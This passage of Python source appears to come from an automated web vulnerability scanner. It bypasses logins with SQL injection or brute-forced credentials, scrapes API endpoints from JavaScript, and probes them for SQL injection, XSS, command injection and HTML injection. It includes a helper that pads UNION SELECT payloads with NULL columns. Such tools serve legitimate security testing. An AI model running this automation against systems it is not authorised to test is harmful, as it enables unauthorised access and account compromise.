                " [+] Login successful via SQL Injection! Proceeding to the target page...")
            login = True
        else:
            print("[-] SQLi login failed.")
            results.append(" [-] SQL Injection failed.")
            # trying brute force after failed SQLi
            creds = brute_force_login(base_url, session)
            print("brute force done")
            if creds:
                print(f"[+] Brute-force success: {creds[0]}:{creds[1]}")
                results.append(
                    f" [+] Brute-force success → Username: {creds[0]} | Password: {creds[1]}")
                login = True
            else:
                results.append(
                    " [-] Login failed using both SQLi and brute-force. Skipping further tests.")

        # If login successful → run further vulnerability tests
        if login:
            # Scan for endpoints first
            endpoints = detect_js_api_endpoints(target_url, session)

            # Check if any API endpoints were detected
            if endpoints:
                results.append(
                    "[+] API Endpoints found — performing API-based testing only.")
                
                # Test ONLY the API endpoints
                results.extend(test_sql_injection(
                    target_url, session, is_api=True, api_endpoints=endpoints))
                results.extend(test_xss(target_url, session,
                               is_api=True, api_endpoints=endpoints))
                results.extend(test_command_injection(
                    target_url, session, is_api=True, api_endpoints=endpoints))
                results.extend(test_html_injection(
                    target_url, session, is_api=True, api_endpoints=endpoints))

            else:
                results.append(
                    "[-] No API endpoints found — performing standard form-based testing.")
                
                # Test standard forms
                results.extend(test_sql_injection(target_url, session))
                results.extend(test_xss(target_url, session))
                results.extend(test_command_injection(target_url, session))
                results.extend(test_html_injection(target_url, session))
                return results
            
        # if login failed
        else:
            print("[-] Access denied — login required but not bypassed.")
            return results  # terminate

    # no login required
    else:
        print("No login required")
        # Scan for endpoints first
        endpoints = detect_js_api_endpoints(target_url, session)

        # Check if any API endpoints were detected
        if endpoints:
            print("[DEBUG] API Endpoints found — performing API-based testing only.")
            results.append(
                "[+] API Endpoints found — performing API-based testing now.")

            # Test ONLY the API endpoints
            results.extend(test_sql_injection(
                target_url, session, is_api=True, api_endpoints=endpoints))
            results.extend(test_xss(target_url, session,
                           is_api=True, api_endpoints=endpoints))
            results.extend(test_command_injection(
                target_url, session, is_api=True, api_endpoints=endpoints))
            results.extend(test_html_injection(
                target_url, session, is_api=True, api_endpoints=endpoints))

        else:
            # results.append("[-] No API endpoints found — performing standard form-based testing.")
            print("[DEBUG] No API Endpoints found — standard form-based testing.")

            # Test standard forms
            results.extend(test_sql_injection(target_url, session))
            results.extend(test_xss(target_url, session))
            results.extend(test_command_injection(target_url, session))
            results.extend(test_html_injection(target_url, session))

        print("[-] No login required.")
        return results


def inject_column_placeholders(payload, num_cols):
    """
    Replaces <<cols>> or <<cols:N>> with the exact number of NULLs needed to
    make the total number of columns in the SELECT statement equal to `num_cols`.
    This works regardless of where <<cols>> appears in the list.

    Args:
        payload (str): SQL injection payload template.
        num_cols (int): Number of columns expected in SELECT query.

    Returns:
        str: Transformed payload with correct column count.
    """

    if "<<" not in payload:
        return payload

    # Match <<cols>> or <<cols:N>>
    match = re.search(r"<<cols(?::(\d+))?>>", payload)
    if not match:
        return payload

    override = match.group(1)
    placeholder = match.group(0)

    # Case 1: <<cols:N>> — use fixed number of NULLs
    if override:
        null_count = int(override)
        nulls = ", ".join(["NULL"] * null_count)
        return payload.replace(placeholder, nulls)

    # Case 2: <<cols>> — auto calculate how many NULLs needed
    # Replace <<cols>> with temporary marker
    temp_payload = payload.replace(placeholder, "__COLS__")

    # Extract column list (between SELECT and -- or end of string)
    try:
        # Try to isolate column list
        after_select = re.split(r"(?i)\bselect\b", temp_payload, maxsplit=1)[1]
    except IndexError:
        # No SELECT keyword — fallback: use full payload
        after_select = temp_payload

    # Cut off at comment/end
    after_select = re.split(r"--|\n|\)|;", after_select)[0]

    # Count all values in the list (except the __COLS__)
    columns = [c.strip() for c in after_select.split(",")]
    known_values = [c for c in columns if "__COLS__" not in c and c]

    known_count = len(known_values)
    null_count = max(0, num_cols - known_count)

    # Replace with correct number of NULLs
    nulls = ", ".join(["NULL"] * null_count)
    return payload.replace(placeholder, nulls)


def detect_js_api_endpoints(url, session):
    """
    Scans embedded JavaScript files for fetch/AJAX API endpoints.

    Args:
        url (str): Page URL to extract <script> sources.
        session (requests.Session): Current HTTP session.

    Returns:
        list: Discovered API endpoints.
    """

    print(" Scanning JavaScript for AJAX/fetch API endpoints...")
    endpoints = set()

    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, "html.parser")

        # Use your reusable function here
        extracted = extract_js_endpoints_from_scripts(url, soup)
        for ep in extracted:
            if not ep.startswith("http"):
                ep = "/".join(url.split("/")[:3]) + \
                    ep if ep.startswith("/") else "/" + ep
            endpoints.add(ep)

        if endpoints:
            print(f"[+] Found potential API endpoints: {endpoints}")
        else:
            print("[-] No AJAX/fetch API endpoints found.")
        return list(endpoints)

    except Exception as e:
        print(f"[-] Error scanning JS endpoints: {e}")
        return []


def extract_js_endpoints_from_scripts(url, soup):
    """
    Extracts potential API endpoints from linked JavaScript files in a given HTML soup.

    Args:
        url (str): Base URL for resolving relative script paths.
        soup (bs4.BeautifulSoup): Parsed HTML object.

    Returns:
        list: Unique list of endpoint paths.
    """

    base_url = "/".join(url.split("/")[:3])
    endpoints = []

    script_tags = soup.find_all("script", src=True)
    for tag in script_tags:
        js_url = tag["src"]
        if not js_url.startswith("http"):
            js_url = base_url + \
                js_url if js_url.startswith("/") else base_url + "/" + js_url
        try:
            js_content = requests.get(js_url, timeout=5).text
            fetch_urls = re.findall(r"fetch\(['\"]([^'\"]+)['\"]", js_content)
            ajax_urls = re.findall(
                r"url\s*:\s*['\"]([^'\"]+)['\"]", js_content)
            endpoints.extend(fetch_urls + ajax_urls)
        except:
            continue
    return list(set(endpoints))
